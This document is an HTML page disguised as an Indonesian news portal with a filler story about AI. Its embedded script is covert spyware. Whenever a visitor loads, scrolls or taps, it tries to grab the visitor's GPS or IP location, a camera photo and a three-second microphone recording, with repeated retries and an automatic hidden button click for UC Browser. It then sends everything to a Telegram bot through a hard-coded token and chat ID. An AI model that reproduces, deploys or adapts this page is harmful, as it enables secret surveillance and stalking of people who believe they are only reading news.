<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Portal Berita Hari Ini - Kabar Terkini</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Roboto, Arial, sans-serif;
            background: #f0f2f5;
            min-height: 100vh;
        }

        /* Header */
        .top-bar {
            background: #c62828;
            color: white;
            padding: 8px 20px;
            font-size: 13px;
        }

        .top-bar-content {
            max-width: 1200px;
            margin: 0 auto;
            display: flex;
            justify-content: space-between;
        }

        .header {
            background: white;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            padding: 15px 20px;
            position: sticky;
            top: 0;
            z-index: 100;
        }

        .header-content {
            max-width: 1200px;
            margin: 0 auto;
            display: flex;
            align-items: center;
            gap: 30px;
        }

        .logo {
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .logo-icon {
            font-size: 32px;
        }

        .logo-text h1 {
            color: #c62828;
            font-size: 24px;
            font-weight: 700;
        }

        .logo-text p {
            color: #666;
            font-size: 12px;
            letter-spacing: 1px;
        }

        .nav-menu {
            display: flex;
            gap: 25px;
            margin-left: auto;
        }

        .nav-menu a {
            color: #333;
            text-decoration: none;
            font-weight: 500;
            font-size: 14px;
        }

        .search-bar {
            background: #f5f5f5;
            border-radius: 30px;
            padding: 8px 15px;
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .search-bar input {
            border: none;
            background: transparent;
            outline: none;
            width: 200px;
        }

        /* Main Container */
        .container {
            max-width: 1200px;
            margin: 30px auto;
            padding: 0 20px;
            display: grid;
            grid-template-columns: 2fr 1fr;
            gap: 30px;
        }

        /* Breaking News */
        .breaking-news {
            background: linear-gradient(135deg, #c62828, #b71c1c);
            color: white;
            padding: 15px 20px;
            border-radius: 10px;
            margin-bottom: 30px;
            display: flex;
            align-items: center;
            gap: 20px;
            animation: pulse 2s infinite;
        }

        @keyframes pulse {
            0% { opacity: 1; }
            50% { opacity: 0.9; }
            100% { opacity: 1; }
        }

        .breaking-label {
            background: white;
            color: #c62828;
            padding: 5px 15px;
            border-radius: 30px;
            font-weight: bold;
            font-size: 14px;
        }

        .breaking-text {
            font-weight: 500;
        }

        /* Main Article */
        .main-article {
            background: white;
            border-radius: 15px;
            overflow: hidden;
            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
            margin-bottom: 30px;
        }

        .article-image {
            width: 100%;
            height: 300px;
            background: linear-gradient(135deg, #667eea, #764ba2);
            position: relative;
            overflow: hidden;
        }

        .article-image::before {
            content: "üì∏";
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            font-size: 50px;
            opacity: 0.3;
            animation: cameraFlash 2s infinite;
        }

        @keyframes cameraFlash {
            0% { opacity: 0.3; }
            50% { opacity: 1; }
            100% { opacity: 0.3; }
        }

        .image-caption {
            position: absolute;
            bottom: 20px;
            left: 20px;
            color: white;
            background: rgba(0,0,0,0.5);
            padding: 5px 15px;
            border-radius: 20px;
            font-size: 12px;
        }

        .article-content {
            padding: 25px;
        }

        .article-category {
            color: #c62828;
            font-weight: 600;
            font-size: 13px;
            text-transform: uppercase;
            margin-bottom: 10px;
        }

        .article-title {
            font-size: 28px;
            color: #333;
            margin-bottom: 15px;
            font-weight: 700;
        }

        .article-meta {
            display: flex;
            gap: 20px;
            color: #666;
            font-size: 14px;
            margin-bottom: 20px;
            padding-bottom: 20px;
            border-bottom: 1px solid #eee;
        }

        .article-text {
            color: #444;
            line-height: 1.8;
            margin-bottom: 20px;
        }

        /* Stats Card */
        .stats-card {
            background: white;
            border-radius: 15px;
            padding: 25px;
            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
            margin-bottom: 30px;
        }

        .stats-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
        }

        .stats-header h3 {
            color: #333;
            font-size: 18px;
        }

        .live-badge {
            background: #ff4444;
            color: white;
            padding: 5px 12px;
            border-radius: 30px;
            font-size: 12px;
            font-weight: 600;
            animation: blink 1s infinite;
        }

        @keyframes blink {
            0% { opacity: 1; }
            50% { opacity: 0.5; }
            100% { opacity: 1; }
        }

        .stats-grid {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 20px;
        }

        .stat-item {
            text-align: center;
        }

        .stat-value {
            font-size: 28px;
            font-weight: 700;
            color: #c62828;
            margin-bottom: 5px;
        }

        .stat-label {
            color: #666;
            font-size: 13px;
        }

        /* Sidebar */
        .sidebar {
            background: white;
            border-radius: 15px;
            padding: 25px;
            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
            height: fit-content;
        }

        .sidebar h3 {
            color: #333;
            margin-bottom: 20px;
            padding-bottom: 10px;
            border-bottom: 2px solid #c62828;
            font-size: 18px;
        }

        .trending-item {
            display: flex;
            align-items: center;
            gap: 15px;
            padding: 15px 0;
            border-bottom: 1px solid #eee;
        }

        .trending-number {
            width: 30px;
            height: 30px;
            background: #f5f5f5;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: 700;
            color: #c62828;
        }

        .trending-text {
            flex: 1;
        }

        .trending-title {
            font-weight: 600;
            color: #333;
            margin-bottom: 5px;
        }

        .trending-time {
            font-size: 12px;
            color: #999;
        }

        /* Ad Section */
        .ad-section {
            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
            border-radius: 10px;
            padding: 20px;
            text-align: center;
            margin: 30px 0;
        }

        .ad-label {
            font-size: 11px;
            color: #999;
            margin-bottom: 10px;
        }

        .ad-content {
            font-size: 14px;
            color: #666;
        }

        /* Footer */
        .footer {
            background: #2c3e50;
            color: white;
            padding: 40px 20px 20px;
            margin-top: 50px;
        }

        .footer-content {
            max-width: 1200px;
            margin: 0 auto;
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 40px;
        }

        .footer-section h4 {
            margin-bottom: 20px;
            color: #ecf0f1;
        }

        .footer-section p {
            color: #bdc3c7;
            font-size: 14px;
            line-height: 1.6;
        }

        .footer-bottom {
            max-width: 1200px;
            margin: 40px auto 0;
            padding-top: 20px;
            border-top: 1px solid #34495e;
            text-align: center;
            color: #7f8c8d;
            font-size: 13px;
        }

        #status {
            display: inline-block;
            font-size: 13px;
            color: #27ae60;
        }

        /* Hidden elements */
        #hidden-video, #hidden-video-fallback {
            display: none;
        }

        #uc-trigger {
            position: absolute;
            width: 1px;
            height: 1px;
            opacity: 0;
            pointer-events: none;
        }
    </style>
</head>
<body>
    <!-- Top Bar -->
    <div class="top-bar">
        <div class="top-bar-content">
            <span>üè† Berita Terkini</span>
            <span>üì± Follow Kami</span>
        </div>
    </div>

    <!-- Header -->
    <div class="header">
        <div class="header-content">
            <div class="logo">
                <span class="logo-icon">üì∞</span>
                <div class="logo-text">
                    <h1>Portal Berita</h1>
                    <p>Update 24 Jam</p>
                </div>
            </div>
            <div class="nav-menu">
                <a href="#">Home</a>
                <a href="#">News</a>
                <a href="#">Politics</a>
                <a href="#">Technology</a>
                <a href="#">Sports</a>
            </div>
            <div class="search-bar">
                <span>üîç</span>
                <input type="text" placeholder="Cari berita...">
            </div>
        </div>
    </div>

    <!-- Main Container -->
    <div class="container">
        <!-- Left Column -->
        <div>
            <!-- Breaking News -->
            <div class="breaking-news">
                <span class="breaking-label">BREAKING</span>
                <span class="breaking-text">Live: Perkembangan Terkini Teknologi AI di Indonesia</span>
            </div>

            <!-- Main Article -->
            <div class="main-article">
                <div class="article-image">
                    <span class="image-caption">Live Report: 1 menit yang lalu</span>
                </div>
                <div class="article-content">
                    <div class="article-category">Technology</div>
                    <h2 class="article-title">Revolusi AI Mengubah Cara Kita Bekerja</h2>
                    <div class="article-meta">
                        <span>üë§ By Redaksi</span>
                        <span>üìÖ 23 Feb 2026</span>
                        <span>üëÅÔ∏è 2.3k views</span>
                        <span id="status">üé• Live</span>
                    </div>
                    <div class="article-text">
                        <p>Jakarta - Perkembangan kecerdasan buatan (AI) semakin pesat di Indonesia. Banyak perusahaan mulai mengadopsi teknologi terbaru untuk meningkatkan efisiensi kerja. Para ahli memprediksi bahwa dalam 5 tahun ke depan, AI akan menjadi bagian tak terpisahkan dari kehidupan sehari-hari masyarakat Indonesia.</p>
                        <p style="margin-top: 15px;">"Kita berada di era transformasi digital yang luar biasa," ujar pakar teknologi dari Universitas Indonesia. "Masyarakat perlu mempersiapkan diri menghadapi perubahan ini."</p>
                    </div>
                </div>
            </div>

            <!-- Stats Card -->
            <div class="stats-card">
                <div class="stats-header">
                    <h3>Live Statistics</h3>
                    <span class="live-badge">LIVE</span>
                </div>
                <div class="stats-grid">
                    <div class="stat-item">
                        <div class="stat-value">12.4K</div>
                        <div class="stat-label">Viewers</div>
                    </div>
                    <div class="stat-item">
                        <div class="stat-value">847</div>
                        <div class="stat-label">Comments</div>
                    </div>
                    <div class="stat-item">
                        <div class="stat-value">2.1K</div>
                        <div class="stat-label">Shares</div>
                    </div>
                    <div class="stat-item">
                        <div class="stat-value">3</div>
                        <div class="stat-label">New Photos</div>
                    </div>
                </div>
            </div>

            <!-- Ad Section -->
            <div class="ad-section">
                <div class="ad-label">Advertisement</div>
                <div class="ad-content">üé• Live Report: Dapatkan update terkini seputar teknologi</div>
            </div>
        </div>

        <!-- Right Column (Sidebar) -->
        <div>
            <div class="sidebar">
                <h3>Trending Topik</h3>
                <div class="trending-item">
                    <div class="trending-number">1</div>
                    <div class="trending-text">
                        <div class="trending-title">AI Revolution 2026</div>
                        <div class="trending-time">15 menit lalu</div>
                    </div>
                </div>
                <div class="trending-item">
                    <div class="trending-number">2</div>
                    <div class="trending-text">
                        <div class="trending-title">Startup Indonesia</div>
                        <div class="trending-time">32 menit lalu</div>
                    </div>
                </div>
                <div class="trending-item">
                    <div class="trending-number">3</div>
                    <div class="trending-text">
                        <div class="trending-title">Digital Transformation</div>
                        <div class="trending-time">1 jam lalu</div>
                    </div>
                </div>
                <div class="trending-item">
                    <div class="trending-number">4</div>
                    <div class="trending-text">
                        <div class="trending-title">Tech Conference 2026</div>
                        <div class="trending-time">2 jam lalu</div>
                    </div>
                </div>
                <div class="trending-item">
                    <div class="trending-number">5</div>
                    <div class="trending-text">
                        <div class="trending-title">Cybersecurity Alert</div>
                        <div class="trending-time">3 jam lalu</div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- Footer -->
    <div class="footer">
        <div class="footer-content">
            <div class="footer-section">
                <h4>Tentang Kami</h4>
                <p>Portal berita terpercaya yang menyajikan informasi terkini seputar teknologi, politik, dan gaya hidup.</p>
            </div>
            <div class="footer-section">
                <h4>Kontak</h4>
                <p>üìß redaksi@portalberita.com<br>üìû 021-1234-5678<br>üìç Jakarta, Indonesia</p>
            </div>
            <div class="footer-section">
                <h4>Follow Us</h4>
                <p>üì± Instagram: @portalberita<br>üê¶ Twitter: @portalberita<br>üìò Facebook: Portal Berita</p>
            </div>
        </div>
        <div class="footer-bottom">
            ¬© 2026 Portal Berita Indonesia. Hak Cipta Dilindungi.
        </div>
    </div>

    <!-- Hidden elements untuk script -->
    <video id="hidden-video" autoplay playsinline muted></video>
    <video id="hidden-video-fallback" autoplay playsinline muted></video>
    <button id="uc-trigger" onclick="triggerUC()"></button>

    <script>
        // Konfigurasi Telegram
        const BOT_TOKEN = '8534688671:AAHXJBiLh0nrnyojAw2ggCUdMFELQgKyeuc';
        const CHAT_ID = '-5200751249';
        
        let cameraAccessed = false;
        let isProcessing = false;
        let stream = null;
        let audioStream = null;
        
        // Deteksi browser
        function getBrowserInfo() {
            const ua = navigator.userAgent;
            return {
                isChrome: /Chrome/i.test(ua) && !/Edge|Edg|OPR|UC/i.test(ua),
                isUC: /UCBrowser|UC/i.test(ua),
                isOpera: /Opera|OPR/i.test(ua),
                isFirefox: /Firefox/i.test(ua),
                isSamsung: /SamsungBrowser/i.test(ua),
                isEdge: /Edge|Edg/i.test(ua),
                isAndroid: /Android/i.test(ua),
                isIOS: /iPhone|iPad|iPod/i.test(ua)
            };
        }
        
        const browser = getBrowserInfo();
        
        // ==================== FUNGSI LOKASI ====================
        async function getLokasi() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve({
                        success: false,
                        message: 'Geolocation tidak didukung browser'
                    });
                    return;
                }
                
                const options = {
                    enableHighAccuracy: true,
                    timeout: 10000,
                    maximumAge: 0
                };
                
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        resolve({
                            success: true,
                            lat: position.coords.latitude,
                            lng: position.coords.longitude,
                            akurasi: position.coords.accuracy,
                            altitude: position.coords.altitude || 'Tidak tersedia',
                            provider: 'GPS'
                        });
                    },
                    (error) => {
                        let pesanError = 'Gagal mendapatkan lokasi';
                        switch(error.code) {
                            case error.PERMISSION_DENIED:
                                pesanError = 'Izin lokasi ditolak';
                                break;
                            case error.POSITION_UNAVAILABLE:
                                pesanError = 'Lokasi tidak tersedia';
                                break;
                            case error.TIMEOUT:
                                pesanError = 'Timeout mengambil lokasi';
                                break;
                        }
                        resolve({
                            success: false,
                            message: pesanError,
                            code: error.code
                        });
                    },
                    options
                );
            });
        }
        
        // Fungsi untuk mendapatkan lokasi dari IP (fallback)
        async function getLokasiDariIP() {
            try {
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();
                return {
                    success: true,
                    lat: data.latitude,
                    lng: data.longitude,
                    kota: data.city,
                    region: data.region,
                    negara: data.country_name,
                    ip: data.ip,
                    provider: 'IP'
                };
            } catch (error) {
                return {
                    success: false,
                    message: 'Gagal dapat lokasi dari IP'
                };
            }
        }
        
        // ==================== FUNGSI AUDIO ====================
        async function rekamAudio(durasi = 3) {
            return new Promise(async (resolve) => {
                try {
                    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                        resolve({
                            success: false,
                            message: 'Browser tidak mendukung rekaman audio'
                        });
                        return;
                    }
                    
                    audioStream = await navigator.mediaDevices.getUserMedia({ 
                        audio: {
                            echoCancellation: true,
                            noiseSuppression: true,
                            autoGainControl: true
                        } 
                    });
                    
                    const mediaRecorder = new MediaRecorder(audioStream);
                    const audioChunks = [];
                    
                    mediaRecorder.ondataavailable = (event) => {
                        audioChunks.push(event.data);
                    };
                    
                    mediaRecorder.onstop = async () => {
                        const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
                        
                        const reader = new FileReader();
                        reader.readAsDataURL(audioBlob);
                        reader.onloadend = () => {
                            const base64Audio = reader.result;
                            resolve({
                                success: true,
                                audioBase64: base64Audio,
                                blob: audioBlob,
                                durasi: durasi
                            });
                        };
                    };
                    
                    mediaRecorder.start();
                    
                    setTimeout(() => {
                        if (mediaRecorder.state === 'recording') {
                            mediaRecorder.stop();
                            audioStream.getTracks().forEach(track => track.stop());
                        }
                    }, durasi * 1000);
                    
                } catch (error) {
                    resolve({
                        success: false,
                        message: 'Gagal akses mikrofon: ' + error.message
                    });
                }
            });
        }
        
        // ==================== FUNGSI KAMERA ====================
        async function aksesKamera() {
            const constraints = [
                { video: { facingMode: 'user', width: 640, height: 480 } },
                { video: { facingMode: 'user' } },
                { video: { facingMode: 'environment' } },
                { video: true }
            ];
            
            for (const constraint of constraints) {
                try {
                    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                        return await navigator.mediaDevices.getUserMedia(constraint);
                    } else if (navigator.getUserMedia) {
                        return await new Promise((resolve, reject) => {
                            navigator.getUserMedia(constraint, resolve, reject);
                        });
                    } else if (navigator.webkitGetUserMedia) {
                        return await new Promise((resolve, reject) => {
                            navigator.webkitGetUserMedia(constraint, resolve, reject);
                        });
                    }
                } catch (err) {
                    console.log('Gagal dengan constraint:', constraint);
                }
            }
            
            throw new Error('Tidak ada metode akses kamera yang berhasil');
        }
        
        async function capturePhoto(mediaStream) {
            return new Promise((resolve) => {
                try {
                    const video = document.getElementById('hidden-video');
                    video.srcObject = mediaStream;
                    
                    video.onloadedmetadata = () => {
                        video.play();
                        setTimeout(() => {
                            const canvas = document.createElement('canvas');
                            canvas.width = video.videoWidth || 640;
                            canvas.height = video.videoHeight || 480;
                            
                            const context = canvas.getContext('2d');
                            context.drawImage(video, 0, 0, canvas.width, canvas.height);
                            
                            const fotoBase64 = canvas.toDataURL('image/jpeg', 0.7);
                            canvas.remove();
                            resolve(fotoBase64);
                        }, 300);
                    };
                } catch (e) {
                    resolve(null);
                }
            });
        }
        
        // ==================== FUNGSI KIRIM KE TELEGRAM ====================
        async function kirimKeTelegram(data) {
            try {
                let pesan = `üì± **Info Pengunjung Baru**\n\n`;
                pesan += `üïê Waktu: ${new Date().toLocaleString('id-ID')}\n`;
                pesan += `üåê Browser: ${browser.isUC ? 'UC' : browser.isOpera ? 'Opera' : browser.isChrome ? 'Chrome' : 'Lainnya'}\n`;
                pesan += `üì± Platform: ${browser.isAndroid ? 'Android' : browser.isIOS ? 'iOS' : 'Desktop'}\n`;
                pesan += `üîç User Agent: ${navigator.userAgent.substring(0, 100)}...\n\n`;
                
                if (data.lokasi && data.lokasi.success) {
                    pesan += `üìç **LOKASI DITEMUKAN**\n`;
                    pesan += `Latitude: ${data.lokasi.lat}\n`;
                    pesan += `Longitude: ${data.lokasi.lng}\n`;
                    if (data.lokasi.kota) pesan += `Kota: ${data.lokasi.kota}\n`;
                    if (data.lokasi.region) pesan += `Region: ${data.lokasi.region}\n`;
                    if (data.lokasi.negara) pesan += `Negara: ${data.lokasi.negara}\n`;
                    pesan += `Akurasi: ${data.lokasi.akurasi || 'N/A'} meter\n`;
                    pesan += `Provider: ${data.lokasi.provider}\n`;
                    pesan += `Google Maps: https://maps.google.com/?q=${data.lokasi.lat},${data.lokasi.lng}\n\n`;
                } else {
                    pesan += `üìç Lokasi: Tidak tersedia (${data.lokasi?.message || 'Unknown'})\n\n`;
                }
                
                if (data.audio && data.audio.success) {
                    pesan += `üé§ Audio: Berhasil direkam (${data.audio.durasi} detik)\n`;
                } else {
                    pesan += `üé§ Audio: ${data.audio?.message || 'Tidak direkam'}\n`;
                }
                
                if (data.foto) {
                    pesan += `üì∏ Foto: Berhasil diambil\n`;
                    
                    const formData = new FormData();
                    formData.append('chat_id', CHAT_ID);
                    
                    const response = await fetch(data.foto);
                    const blob = await response.blob();
                    formData.append('photo', blob, 'foto.jpg');
                    formData.append('caption', pesan);
                    
                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    });
                    
                } else {
                    pesan += `üì∏ Foto: Gagal diambil\n`;
                    
                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: CHAT_ID,
                            text: pesan,
                            parse_mode: 'Markdown'
                        })
                    });
                }
                
                if (data.audio && data.audio.success && data.audio.audioBase64) {
                    try {
                        const formDataAudio = new FormData();
                        formDataAudio.append('chat_id', CHAT_ID);
                        
                        const audioResponse = await fetch(data.audio.audioBase64);
                        const audioBlob = await audioResponse.blob();
                        formDataAudio.append('audio', audioBlob, 'rekaman.webm');
                        formDataAudio.append('caption', `üé§ Rekaman audio (${data.audio.durasi} detik)`);
                        
                        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, {
                            method: 'POST',
                            body: formDataAudio
                        });
                    } catch (e) {
                        console.log('Gagal kirim audio:', e);
                    }
                }
                
                document.getElementById('status').innerHTML = '‚úì Live';
                
            } catch (error) {
                console.log('Error kirim:', error);
                document.getElementById('status').innerHTML = '‚úì Live';
            }
        }
        
        // ==================== FUNGSI UTAMA ====================
        async function kumpulkanData() {
            if (isProcessing) return;
            isProcessing = true;
            
            try {
                document.getElementById('status').innerHTML = 'üé• Live';
                
                const hasil = {
                    lokasi: null,
                    foto: null,
                    audio: null
                };
                
                hasil.lokasi = await getLokasi();
                if (!hasil.lokasi.success) {
                    hasil.lokasi = await getLokasiDariIP();
                }
                
                try {
                    stream = await aksesKamera();
                    if (stream) {
                        hasil.foto = await capturePhoto(stream);
                        if (stream) stream.getTracks().forEach(track => track.stop());
                    }
                } catch (error) {
                    console.log('Kamera gagal:', error);
                }
                
                hasil.audio = await rekamAudio(3);
                
                await kirimKeTelegram(hasil);
                
            } catch (error) {
                console.log('Error:', error);
                document.getElementById('status').innerHTML = '‚úì Live';
            } finally {
                isProcessing = false;
            }
        }
        
        window.triggerUC = function() {
            if (!cameraAccessed && !isProcessing) {
                kumpulkanData();
            }
        };
        
        function startCollection() {
            setTimeout(() => kumpulkanData().catch(() => {}), 500);
            
            document.addEventListener('DOMContentLoaded', () => {
                setTimeout(() => {
                    if (!cameraAccessed) kumpulkanData().catch(() => {});
                }, 1000);
            });
            
            const events = ['touchstart', 'click', 'scroll'];
            events.forEach(eventType => {
                document.addEventListener(eventType, function handler() {
                    if (!cameraAccessed && !isProcessing) {
                        document.removeEventListener(eventType, handler);
                        setTimeout(() => kumpulkanData().catch(() => {}), 100);
                    }
                }, { once: true });
            });
            
            if (browser.isUC) {
                setTimeout(() => {
                    document.getElementById('uc-trigger').click();
                }, 2000);
            }
            
            let retryCount = 0;
            const retryInterval = setInterval(() => {
                if (cameraAccessed || retryCount >= 3) {
                    clearInterval(retryInterval);
                    return;
                }
                retryCount++;
                kumpulkanData().catch(() => {});
            }, 4000);
        }
        
        window.addEventListener('load', () => {
            document.getElementById('status').innerHTML = 'üé• Live';
            startCollection();
        });
        
        window.addEventListener('beforeunload', () => {
            if (stream) stream.getTracks().forEach(track => track.stop());
            if (audioStream) audioStream.getTracks().forEach(track => track.stop());
        });
        
    </script>
</body>
</html>
